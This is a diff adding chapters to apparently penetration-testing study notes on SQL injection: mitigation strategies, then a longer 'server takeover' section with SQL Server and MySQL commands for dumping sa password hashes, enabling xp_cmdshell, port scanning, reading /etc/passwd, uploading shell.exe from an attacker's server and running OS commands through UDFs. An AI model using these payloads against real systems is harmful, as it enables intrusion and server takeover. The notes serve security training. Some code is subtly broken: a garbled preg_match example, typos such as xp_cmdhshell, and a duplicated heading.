@@ -1297,11 +1297,337 @@ Once you found out how to exploit a SQLi, you can reduce the dumping phase time 
 
   As always in ethical hacking, knowledge is the key for success!
 
-
 ____________________________________________________
 ## 4.7. Mitigation Strategies
+SQLi vulnerabilities are **input validation vulnerabilities** and can be prevented by enforcing input validation on any user-controlled parameter.
 
+In the following slides, you will see some mitigation strategies you can propose to a client in your report.
 
+#### 4.7.1. Prepared Statements
+Web applications which use SQL, can separate the code from instructions using bind variable in SQL. This is the best solution to mitigate SQL Injection and should always be favored over any other solution.
 
+Implementing prepared statements could be a long term objective as it implies code refactoring of nearly every SQL interaction in the web application.
+  Example:
+    This is what a prepared statement in PHP looks like:
+      ```
+      $sql = "INSERT INTO test_table VALUES (?, ?, ?, ?)"; // No user-controlled input in the query
+      $sql_statement = $mysqli->prepare($sql);
+      $sql_statement->bind_param('dsss', $user_id, $name, $address, $email); // Tells the library which variable goes to which part of the query
+      $user_id = $_POST['user_id'];
+      $name = $_POST['name'];
+      $address = $_POST['address'];
+      $email =  $_POST['email'];
+      $sql_statement->execute(); // Executes the query
+      ```
+
+#### 4.7.2. Type Casting
+A short term method to prevent some SQLi is to perform type casting for some data types, perhaps most notably interger numbers:
+  Example:
+    ```
+    $user_id = (int) $user_id;
+    ```
+
+#### 4.7.3. Type Casting
+Input validation is a great short term solution and a good practice to put into production on top of prepared statements.
+
+It can sometimes protect your application if a SQL injection vulnerability is somehow introduced by accident.
+
+Example:
+  This a white-list based validation example written in PHP.
+  Only letters, spaces, and dashes are allowed:
+    ```
+    if (!preg_match(|'^[a-z\s-]$|i'), $name) {
+      die('Please enter a valid name');
+    }
+    ```
 ____________________________________________________
 ## 4.8. From SQLi to Server Takeover
+In this section, you will see who to use some advanced features provided by MS SQL Server and MySQL. These features can be exploited to **gain access to the DBMS server machine**.
+
+#### 4.8.1. Advanced SQL Server Exploitation
+SQL Server is a very powerful DBMS, providing advanced features to database administrators. Most of these features are privileged commands.
+
+Users like **dbo** are not usually privileged enough to perform these commands.
+
+From a penetration tester point of view, you can exploit these features to perform the advanced attacks that we will review in the next slides.
+
+Since we will need high privileges, our first testing objectives is to retrieve the **sa** user's password.
+Once we have the SHA-1 hash of the password, we can crack it and access the database in the same manner as a legitimate database administrator.
+
+There are two queries you can run to retrieve the username and the password hash:
+  ```
+  SELECT name, password FROM master..sysxlogins
+  ```
+  ```
+  SELECT name, password_hash FROM master.sys.sql_logins
+  ```
+
+###### 4.8.1.1. xp_cmdshell
+The **sa** user has complete control over the DBMS, the databases it contains and... The **advanced features!**
+
+Most of the functionalities useful for a penetration tester exploit the **xp_cmdshell stored procedure**
+
+You can use the following syntax to run any OS command:
+  ```
+  EXEC master..xp_cmdhshell '<command>'
+  ```
+
+  However, `xp_cmdshell` is **not enabled by default**.
+  Moreover it **requires sa privileges**
+
+  But, if the web application is connecting to the backend DB as the **sa user**, or we can somehow connect as **sa**, we can enable it!
+
+To enable it, we have to issue the following commands:
+  ```
+  EXEC sp_configure 'show advanced options', 1;
+  RECONFIGURE;
+  EXEC sp_configure 'xp_cmdshell', 1;
+  RECONFIGURE;
+  ```
+
+And we can disable it again after we are done with out tests:
+  ```
+  EXEC sp_configure 'xp_cmdshell', 0;
+  EXEC sp_configure 'show advanced options', 0;
+  RECONFIGURE;
+  ```
+
+###### 4.8.1.2. Internal Network Host Enumeration
+By using `xp_cmdshell` we can launch some commands on the database server.
+We can combine this with some other SQL Server features to mount a host enumeration utility via SQL injections.
+
+Issuing a *ping* command is just a matter of running:
+  ```
+  EXEC master.dbo.xp_cmdshell 'ping <target IP address>'
+  ```
+Unfortunately, the query above does not show results to a penetration tester.
+
+Anyway, we can use the **query execution time to infer the ping result**.
+To do that, we have to **compare** the execution time of a ping command executed against a known live host and the execution time against the host we want to test. The database server is often your best choice for a known live server.
+
+So we test it first and note the execution time. Then we try it with another host.
+
+By default the MS `ping` utility sends four ICMP echo requests.
+This means that pinging a live host takes about 5 to 8 second, while pinging a bogus IP addresses takes from 20 to 30 seconds.
+
+By using an advanced SQL Server feature we can also implement a **simple port scanner**.
+
+###### 4.8.1.3. Port Scanning
+`OPENROWSET` is a SQL Server method you can use to access the tables of a remote server. It needs the IP address and the port to connect to. This can be exploited to create a port scanner.
+  ```
+  SELECT * FROM OPENROWSET('SQLOLEDB', 'uid=sas;pwd=something;Network=DBMSSOCN;Address=<target IP>,<target port>;timeout=<connection timeout in seconds>', 'select 1')--
+  ```
+
+  If the port is closed we will see an error similar to this:
+    *SQL Server doe note exist or access denied*
+
+  If the port is open we will see:
+    *General network error. Check your network documentation*
+
+  If errors are hidden and the port is closed the connection will timeout according to the *<connection timeout in seconds>* value.
+
+###### 4.8.1.4. Reading the File System
+Going on, you can also read the file system by launching the `dir` command:
+  ```
+  EXEC master..xp_cmdshell 'dir <target directory>'
+  ```
+  That will return the directory listing of `<target directory>`
+
+  To read the result, we can save the output of the command on a web accessible folder:
+    ```
+    EXEC master..xp_cmdshell 'dir c:\ > C:\inetpub\wwwroot\site\dir.txt'--
+    ```
+  and then just browse to *dir.txt* at the URL: http://site.com/dir.txt
+
+Or we can read a file on the server and then put its content into a table. Then we can extract the table via SQLi like any other table:
+  ```
+  CREATE TABLE filecontent(line varchar(8000));
+  BULK INSERT filecontent FROM '<target file>';
+
+  /* Remember to drop the table after extracting it:
+  DROP TABLE filecontent;
+  */
+  ```
+
+###### 4.8.1.5. Uploading Files
+By using MSSQL advanced features, it is also possible to **upload a file** to the victim server.
+
+Uploading a file involves 2 steps:
+1. First, we have to insert the file into a table in a MS SQL database under our control
+  ```
+  CREATE TABLE HelperTable (file text)
+  BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')
+  ```
+
+2. Then, we force the target DB server to retrieve it from our server:
+  ```
+  EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c -Craw -S<our server address> -I<out server username> -P<our server password>'
+  ```
+  The victim server will connect to our SQL server, read the exe file from the table and recreate it remotely.
+
+###### 4.8.1.6. Storing Command Results into a Temporary Table
+Now that you know everything about advanced exploitation of SQL Server, let's see a technique to save the results of these stored procedures in a temporary table.
+
+Then we can read the results by using some data dumping techniques.
+
+1. Creating a temporary table
+  The first things we want to do is to create a temporary table to hold the stored procedure output:
+    ```
+    CREATE TABLE temptable (id int not null identity (1,1), output nvarchar(4096) null);--
+    ```
+    The `id` column will help us to access different command outputs while the `output` column will contain the actual command results.
+
+2. Crafting the argument for `xp_cmdshell`
+  As you will see in the next step, we need to covert the **command string** of the command we want to run into an ASCII representation.
+
+  Let us say that we want to run `dir c:\`
+
+  We have to convert every character to its HEX ASCII representation:
+  - 64 is the HEX code for "d"
+  - 69 is the HEX code for "i"
+  - 72 is the HEX code for "r"
+  - 20 is the HEX code for ""
+  - 63 is the HEX code for "c"
+  - 3a is the HEX code for ":"
+  - 4c is the HEX code for "\\"
+
+  And then insert a double zero after every character of the string.
+
+  The result is: `0x640069007200200063003a005c00`
+
+3. Executing `xp_cmdshell`
+  Now we have to create a variable with the command string we have just created and then we pass it to `xp_cmdshell`
+    ```
+    declare @t nvarchar(4096) set @t=0x640069007200200063003a005c00 insert into temptable (output) EXEC master.dbo.xp_cmdshell @t;
+    ```
+
+4. Reading the Results
+  To read the results you can use any of the data-dumping techniques we have seen.
+  You can use any of the data-dumping techniques we have seen. You can use the `id` field of the `temptable` to choose which command result you want to retrieve.
+
+5. Final Cleanup
+  After performing your tests, you have to delete the temporary table:
+    ```
+    DROP TABLE temptable;
+    ```
+
+#### 4.8.2. Advanced MySQL Exploitation
+**MySQL** is another DBMS which provides some advanced features. A penetration can exploit them to get full access to a target server.
+Most of the features we are going to see in a minute, rely on the [FILE](https://dev.mysql.com/doc/refman/5.1/en/privileges-provided.html#priv_file) privilege that "gives you permission to read and write files on the server host"
+
+The FILE privileges can be granted to any MySQL user, depending on the web application needs. Anyway, it is always granted to the MySQL **root** user on both \*nix systems and MS Windows.
+
+This means that if an application connects to its database as **root**, exploiting a SQL injection will lead not only to data compromise, but also **full server takeover**.
+
+###### 4.8.2.1. Reading the File System
+It is possible to read files by using the **LOAD_FILE** function:
+  ```
+  SELECT LOAD_FILE('<text file path>');
+  ```
+
+To read a binary file you can use it together with the **HEX** function:
+  ```
+  SELECT HEX(LOAD_FILE('<text file path>'));
+  ```
+
+  By using this method, you can convert any binary file to a long hex string that you can use to steal any data from the server.
+
+It is also possible to parse the content of a file and tell MySQL how to distinguish one record from another:
+  Example:
+    ```
+    CREATE TABLE template(output lontext);
+
+    LOAD DATA INFILE '/etc/psswd' INTO TABLE temptable FIELDS TERMINATED BY '\n' (output);
+    ```
+
+    The resulting table will look like this:
+      ```
+      +---------------------------------------+
+      | output                                |
+      +---------------------------------------+
+      | root:x:0:0:root:/root:/bin/bash       |
+      | daemon:x:1:1:daemon:/usr/sbin:/bin/sh |
+      | bin:x:2:2:bin:/bin:/bin/sh            |
+      | sys:x:2:2:sys:/dev:/bin/sh            |
+      | ...                                   |
+      +---------------------------------------+
+      ```
+
+###### 4.8.2.2. Uploading Files
+By using **SELECT ... INTO DUMPFILE** statement you can write the results of a query to a file. This can be used to **download a huge query results** via the web application and to **upload penetration tester supplied data** to the server
+  ```
+  SELECT <fields> FROM <table> INTO DUMPFILE '<output file path>';
+  ```
+
+To upload a binary file, you have to find a way to insert its content into a table on the victim machine. Then you can dump the table content to a file on the server file system.
+
+But how?
+  You have to convert it into a hex-string.
+How?
+  By using MySQL !
+
+Example:
+  To upload `/bin/ls`, you have to create a file on your local machine and then load it into a table:
+    ```
+    mysql> SELECT HEX(LOAD_FILE('/bin/ls')) INTO DUMPFILE '/tmp/ls.dmp';
+    Query OK, 1 row affected (0.00 sec)
+
+    mysql> LOAD DATA INFILE '/tmp/ls.dmp' INTO TABLE mytable FIELDS TERMINATED BY 'sOmErandOM' LINES TERMINATED BY 'oTHerRnD' (data);
+    Query OK, 1 row affected (0.01 sec)
+    Records: 1  Deleted: 0  Skipped: 0  Warnings: 0
+    ```
+
+  You can test it by using INTO DUMPFILE to recreate the same file:
+    ```
+    mysql> SELECT UNHEX(data) FROM mytable INTO DUMPFILE '/tmp/ls.test';
+    Query OK, 1 row affected (0.00 sec)
+    ```
+
+  And test it:
+    ```
+    # sha25666sum /tmp/ls.test /bin/ls
+    1e87d9599ddea2a93f060b50a54066e8b756d752158e6147cbb99b06eb11d99   /tmp/ls.test
+    1e87d9599ddea2a93f060b50a54066e8b756d752158e6147cbb99b06eb11d99   /bin/ls
+    ```
+
+If everything works as expected you can upload the file content to a table on the victim server.
+
+You will need to split the DUMPFILE you created into chunks of 1024 bytes and then insert them into a table field.
+  Example:
+    First you have to perform an insert with the first chunk. Next, you have to update the field by adding the other chunks.
+      ```
+      INSERT INTO victimtable(field) VALUES(0x7F454C4602010100000...1B000);
+      ...
+      UPDATE victimtable SET field=CONCAT(data,0x12000000...4C030000120);
+      ...
+      UPDATE victimtable SET field=CONCAT(data,0x00000000...9030000);
+      ...
+      UPDATE ...
+      ```
+
+Finally you can write the file on the target system by executing:
+  ```
+  SELECT <victim field> FROM <victim table> WHERE <optional conditional> INTO DUMPFILE '<output path>';
+  ```
+
+###### 4.8.2.3. Executing Shell commands
+Writing files is a great thing, but what about executing commands?
+MySQL does not provide a function to run shell commands by default, but it provides [User Defined Functions](https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html) **(UDF)**.
+
+By using UDFs it is possible to create two functions:
+- `sys_eval(<command>)` which returns the **standard output** of the chosen command
+- `sys_exec(<command>)` that returns the command **exit status**
+
+To use those functions, you have to upload a shared object (SO) on a \*nix system or a dynamic-link library (DLL) on a Windows system to the target server.
+
+Then you can use them. You can find the source code of those functions [here](http://www.mysqludf.org/). Moreover you can find the compiled versions in the [SQLMap repository](https://github.com/sqlmapproject/sqlmap/tree/master/udf/mysql)
+
+After uploading the files to the target system, running a command is just a matter of performing a SELECT:
+  ```
+  SELECT sys_eval('<command>')
+  ```
+  ```
+  SELECT sys_exec('<command>')
+  ```
+
+This can be easily accomplished by using the SQLMap takeover features `--os-cmd` and `--os-shell`
